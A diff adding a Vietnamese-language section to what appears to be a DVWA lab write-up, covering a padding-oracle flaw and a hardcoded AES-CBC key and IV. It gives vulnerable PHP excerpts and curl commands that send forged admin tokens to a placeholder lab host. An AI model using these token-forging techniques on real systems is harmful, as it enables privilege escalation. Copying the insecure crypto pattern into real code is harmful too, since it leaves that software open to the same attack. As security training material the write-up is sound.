@@ -129,6 +129,135 @@ curl -i -X POST 'http://[DVWA_IP]/vulnerabilities/upload/'      -b 'security=hig
 <img width="2557" height="1017" alt="image" src="https://github.com/user-attachments/assets/e8f46328-d5cf-4f22-86b9-fa02f20253fd" />
 
 
+# Privilege Escalation via Cryptographic Failures (OWASP A02:2021)
+
+## Method
+Phân tích chức năng kiểm tra token tại `/vulnerabilities/cryptography/` cho thấy ứng dụng sử dụng chế độ mã hóa AES-CBC không an toàn, dẫn đến hai lỗ hổng nghiêm trọng **Padding Oracle** và **Hardcoded key**,
+
+## Vulnerable Code 
+### vulnerabilities/cryptography/source/check_token_high.php
+```php
+function check_token ($data) {
+    // ...
+    try {
+        $d = decrypt ($ciphertext, $iv); // Thử giải mã
+        if (preg_match ("/^userid:(\d+)$/", $d, $matches)) {
+            // ...
+            $ret = array ( "status" => 200, ... ); // Thành công
+        } else {
+            $ret = array ( "status" => 527, ... ); // Padding đúng, nội dung sai
+        }
+    } catch (Exception $exp) {
+        // LỖ HỔNG: Phản hồi lỗi cụ thể cho việc giải mã thất bại (Padding sai)
+        $ret = array (
+                        "status" => 526,
+                        "message" => "Unable to decrypt token",
+                        "extra" => $exp->getMessage()
+                    );
+    }
+    // ...
+    return json_encode ($ret);
+}
+````
+**Padding Oracle:** Ứng dụng trả về các mã trạng thái/thông báo lỗi khác nhau (ví dụ: status `526`) khi quá trình giải mã thất bại do "bad padding" so với các lỗi khác. Sự khác biệt này đóng vai trò là một "Oracle", cho phép giải mã và mã hóa (giả mạo) dữ liệu tùy ý mà không cần biết *private key*.
+
+### vulnerabilities/cryptography/source/token_library_high.php
+
+```php
+// Trích đoạn từ: token_library_high.php
+define ("KEY", "rainbowclimbinghigh");
+define ("ALGO", "aes-128-cbc");
+define ("IV", "1234567812345678");
+
+function create_token ($debug = false) {
+    $token = "userid:2";
+    // ...
+    // IV bị tái sử dụng liên tục
+    $e = encrypt ($token, IV); 
+    // ...
+}
+```
+
+**Hardcoded Key & IV:** Khóa bí mật (KEY) và Initialization Vector (IV) được định nghĩa cứng (hardcoded) trực tiếp trong mã nguồn. Nếu attacker đọc được mã nguồn (ví dụ đọc qua lỗ hổng LFI), họ có thể bỏ qua hoàn toàn cuộc tấn công Padding Oracle và mã hóa token "admin" một cách trực tiếp.
+
+## Proof of Value (PoV)
+
+Chúng tôi trình bày hai kịch bản tấn công với hai giả định khác nhau. Cả hai đều dẫn đến kết quả cuối cùng là nâng quyền lên "admin".
+
+### Kịch bản 1: Tấn công Black-box (Padding Oracle Attack)
+
+Kịch bản này giả định kẻ tấn công không có quyền truy cập vào mã nguồn. Kẻ tấn công sẽ lợi dụng Lỗ hổng 1 (Padding Oracle) để giả mạo token.
+
+  * **Mục tiêu:** Sử dụng Oracle (lỗi `status: 526`) để đoán và tạo ra một token "admin" hợp lệ.
+
+  * **Giai đoạn 1: Thu thập mẫu Token**
+    Lấy một cặp `token` và `iv` hợp lệ từ ứng dụng (ví dụ: của user "Bungle").
+
+      * Token (Base64): `[TOKEN_BASE64_CỦA_USER_BUNGLE]`
+      * IV (Base64): `[IV_BASE64_CỦA_USER_BUNGLE]`
+
+  * **Giai đoạn 2: Thực thi Exploit Script**
+    Chạy script `padding_oracle.php` để tự động hóa cuộc tấn công dự đoán token của "admin".
+
+    ```bash
+    # Lệnh chạy script khai thác
+    php padding_oracle.php \
+        --url "http://[DVWA_IP]/vulnerabilities/cryptography/source/check_token_high.php" \
+        --token "[TOKEN_BASE64_CỦA_USER_BUNGLE]" \
+        --iv "[IV_BASE64_CỦA_USER_BUNGLE]"
+    ```
+
+  * **Giai đoạn 3: Xác minh Nâng quyền**
+    Script sẽ trả về một cặp `token` và `iv` mới đã được giả mạo (ví dụ: `{"token": "...", "iv": "..."}`). Gửi cặp token này lên server:
+
+    ```bash
+    # Gửi token/iv đã giả mạo tới endpoint chính
+    curl -G 'http://[DVWA_IP]/vulnerabilities/cryptography/' \
+         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
+         --data-urlencode 'token=[FORGED_ADMIN_TOKEN]' \
+         --data-urlencode 'iv=[FORGED_ADMIN_IV]' \
+         --data-urlencode 'Check=Check'
+    ```
+
+  * **Kết quả:** Server trả về "Welcome admin" (hoặc thông tin user "Geoffery").
+
+### Kịch bản 2: Tấn công White-box (LFI + Hardcoded Key)
+
+Kịch bản này giả định kẻ tấn công đã sử dụng một lỗ hổng khác (như Local File Inclusion - LFI) để đọc được mã nguồn của `token_library_high.php` và phát hiện ra Lỗ hổng 2 (Hardcoded Key).
+
+  * **Mục tiêu:** Sử dụng `KEY` và `IV` bị lộ để tự mã hóa (encrypt) một token "admin".
+
+  * **Giai đoạn 1: Lấy thông tin nhạy cảm (Giả định)**
+    Kẻ tấn công đã đọc `token_library_high.php` và biết được:
+
+      * `KEY`: `rainbowclimbinghigh`
+      * `ALGO`: `aes-128-cbc`
+      * `IV`: `1234567812345678` (Lưu ý: `IV` này được dùng để *tạo* token, khác với `IV` trả về cho client)
+
+  * **Giai đoạn 2: Tạo Script Giả mạo (Forge Script) và xác minh**:
+    Sử dụng script tạo token đơn giản `forge_token.python` để tạo token "admin" và gửi cho server.
+    
+    Script sẽ trả về:
+
+    ```
+    --- Payload cho kịch bản White-box ---
+    Forged Token (Base64): [FORGED_ADMIN_TOKEN_BASE64]
+    IV (Base64): MTIzNDU2NzgxMjM0NTY3OA== 
+    ```
+
+    Sử dụng payload này để gửi request (giống Giai đoạn 3 của Kịch bản 1):
+
+    ```bash
+    curl -G 'http://[DVWA_IP]/vulnerabilities/cryptography/' \
+         -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]' \
+         --data-urlencode 'token=[FORGED_ADMIN_TOKEN_BASE64]' \
+         --data-urlencode 'iv=MTIzNDU2NzgxMjM0NTY3OA==' \
+         --data-urlencode 'Check=Check'
+    ```
+
+  * **Kết quả:** Server trả về "Welcome admin". 
+
+
 
 
 
